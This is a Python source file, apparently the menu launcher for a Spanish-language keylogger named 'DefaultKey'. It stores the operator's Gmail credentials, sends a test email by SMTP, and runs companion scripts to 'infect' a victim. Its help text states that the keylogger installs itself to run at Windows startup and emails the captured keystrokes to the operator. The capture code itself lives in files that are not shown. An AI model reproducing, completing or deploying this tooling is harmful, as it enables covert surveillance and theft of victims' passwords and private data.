import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import subprocess
import time

#Experimental

##def COMPROBAR_CONEXION(host='https://www.google.com'):
##	print("Verificando su conexion a internet...")
##	time.sleep(5)
##	try:
##		req = requests.get(host, timeout=15)
##		if req.status_code == 200:
##			print("Conexion a internet exitosa.")
##			time.sleep(5)
##			pass
##	except:
##		print("Sin conexion a internet.")
##		exit(0)
		
def borrarPantalla():
	
	if os.name == "posix":
		os.system ("clear")
	elif os.name == "ce" or os.name == "nt" or os.name == "dos":
		os.system ("cls")

def CONTRASEÑAS_PYW():
	
	if os.name == "posix":
		os.system("python3 Contraseñas.pyw")
	elif os.name == "ce" or os.name == "nt" or os.name == "dos":
		SCRIPT_ENCRIPTADO = subprocess.call("Contraseñas.pyw",shell=True)


def INFECCION():

	if os.name == "posix":
		os.system("python3 Copiado_de_Datos.pyw")
	elif os.name == "ce" or os.name == "nt" or os.name == "dos":
		SCRIPT_DE_COPIADO = subprocess.call("Copiado_de_Datos.pyw",shell=True)

def TEXTO():

        print("Digita el Cuerpo del mensaje cuando se enciende una PC")
        MENSAJE = input(">> ")
        f = open('msg.txt','w')
        f.write(MENSAJE)
        f.close()

borrarPantalla()

while True:   		

        print("""
████████▄     ▄████████    ▄████████    ▄████████ ███    █▄   ▄█           ███     
███   ▀███   ███    ███   ███    ███   ███    ███ ███    ███ ███       ▀█████████▄ 
███    ███   ███    █▀    ███    █▀    ███    ███ ███    ███ ███          ▀███▀▀██ 
███    ███  ▄███▄▄▄      ▄███▄▄▄       ███    ███ ███    ███ ███           ███   ▀ 
███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀███████████ ███    ███ ███           ███     
███    ███   ███    █▄    ███          ███    ███ ███    ███ ███           ███     
███   ▄███   ███    ███   ███          ███    ███ ███    ███ ███▌    ▄     ███     
████████▀    ██████████   ███          ███    █▀  ████████▀  █████▄▄██    ▄████▀   
   ▄█   ▄█▄    ▄████████ ▄██   ▄                             ▀                     
  ███ ▄███▀   ███    ███ ███   ██▄                                                 
  ███▐██▀     ███    █▀  ███▄▄▄███                                                 
 ▄█████▀     ▄███▄▄▄     ▀▀▀▀▀▀███                                                 
▀▀█████▄    ▀▀███▀▀▀     ▄██   ███                                                 
  ███▐██▄     ███    █▄  ███   ███                                                 
  ███ ▀███▄   ███    ███ ███   ███                                                 
  ███   ▀█▀   ██████████  ▀█████▀                                                  
  ▀                                                                                
        """)
        print("")
        print("=========")
        print("keylogger")
        print("=========")
        print("")
        print("==========")
        print("by Default")
        print("==========")
        print("")
        print("[1] Configurar correo")
        print("[2] Informacion")
        print("[3] Instalar KeyLogger")
        print("[4] Modificar mensaje Cuando se enciende una PC")
        print("[99] Salir")
        print("")
        OP = int(input(">> "))

        if OP == 1 :
            print("Digite el correo de Gmail")
            CORREO = input(">> ")
            ARCHIVO = open("../DefaultKey/Config/dato.enc","w")
            ARCHIVO.write(CORREO)
            ARCHIVO.close()
            print("Digite Contraseña")
            CONTRASEÑA = input(">> ")
            ARCHIVO = open("../DefaultKey/Config/password.enc","w")
            ARCHIVO.write(CONTRASEÑA)
            ARCHIVO.close()
            TEXTO()
            CONTRASEÑAS_PYW()
            print ("Espere, Configurando...")
            msg = MIMEMultipart()
            TEXTO_DE_CONFIRMACION = "Se ha configurado con exito."
            password = CONTRASEÑA
            msg['From'] = CORREO
            msg['To'] = CORREO
            msg['Subject'] = "DefaultKey"
            
            msg.attach(MIMEText(TEXTO_DE_CONFIRMACION, 'plain'))
            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            server.login(msg['From'], CONTRASEÑA)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
            print("")
            print ("Correo de confirmacion enviado a %s" % (msg['To']))
            input("Pulse cualquier tecla para continuar")
            borrarPantalla()
            
        elif OP == 2 :
            
                print("informacion")
                print('''
Este Script te permite configurar un correo para que el keylogger envie los datos registrados.

El Keylogger se autocreara y ejecutara al iniciar en windows.

Si ya tienes configurado el correo selecciona la opcion 3 para infectar a la victima.

La cuarta opcion te permite poner un mesaje cuando encienden una PC infectada, por ejemplo: Se ha encendido la PC de Juanito

Recuerda permitir acceso a aplicaciones poco seguras de Gmail para recibir el correo de forma correcta.
                ''')
                input("Pulse cualquier tecla para continuar")
                borrarPantalla()
                
        elif OP == 3 :

                INFECCION()
                print("Listo")
                input("Pulse cualquier tecla para continuar")
                borrarPantalla()

        elif OP == 4 :

                TEXTO()
                print("Listo...")
                input("Pulse cualquier tecla para continuar")
                borrarPantalla()

        elif OP == 99 :

                
                borrarPantalla()
                print("Cerrado...")
                break
        
        else:

            print("Error de Operacion")
            input("Pulse cualquier tecla para continuar")
